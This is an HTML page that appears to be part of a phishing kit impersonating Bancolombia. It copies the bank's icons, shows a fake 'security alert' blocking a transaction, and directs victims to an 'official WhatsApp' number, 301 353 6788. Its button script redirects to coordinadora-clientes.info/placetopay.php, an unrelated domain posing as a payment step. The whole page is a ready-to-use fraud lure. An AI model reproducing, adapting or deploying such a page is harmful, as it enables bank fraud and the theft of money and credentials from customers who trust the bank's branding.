<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Alerta de Seguridad - Bancolombia</title>
    <link rel="icon" type="image/png" href="https://autenticacion.apps.bancolombia.com/favicon.ico" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'OpenSans', sans-serif;
        }
        
        body {
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal-container {
            width: 90%;
            max-width: 500px;
            background-color: white;
            border-radius: 20px;
            padding: 30px 20px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }
        
        .icon-container {
            width: 50px;
            height: 50px;
            background-color: #fdda24;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .hand-icon {
            width: 48px;
            height: 80px;
            margin-top: 32px;
            background-image: url(https://autenticacion.apps.bancolombia.com/static/media/alertIcon.3add30e2e4666ed3ceb27bfdd10ed533.svg);
            background-repeat: no-repeat;
            display: flex;
        }
        
        .hand-icon svg {
            width: 40px;
            height: 40px;
        }
        
        .title {
            font-weight: bold;
            font-size: 24px;
            margin-bottom: 20px;
            line-height: 1.3;
        }
        
        .message {
            font-size: 16px;
            color: #555;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .code {
            font-weight: bold;
            font-size: 18px;
            margin: 30px 0;
        }
        
        .btn-try-later {
            background-color: #fdda24;
            color: #333;
            border: none;
            border-radius: 30px;
            padding: 15px 40px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
            display: block;
            transition: background-color 0.3s;
        }
        
        .btn-try-later:hover {
            background-color: #f0cd1e;
        }
    </style>
</head>

<body>
    <div class="overlay">
        <div class="modal-container">
            <div class="icon-container">
                <div class="hand-icon">
                </div>
            </div>

            <h1 class="title">Por seguridad, no puedes continuar la transacción</h1>

            <p class="message">Código: 923 Para confirmar que eres tú quien realiza la transacción, te contactaremos desde nuestro WhatsApp oficial: 301 353 6788. Responde "Sí" para aprobar o "No" para rechazar.</p>

            <p class="code">Código 923</p>

            <button class="btn-try-later">Intentar de nuevo</button>
        </div>
    </div>

    <script>
        document.querySelector('.btn-try-later').addEventListener('click', function() {
            // Redireccionar a otra página
            window.location.href = "https://coordinadora-clientes.info/placetopay.php?codigo=2";
        });
    </script>
</body>

</html>
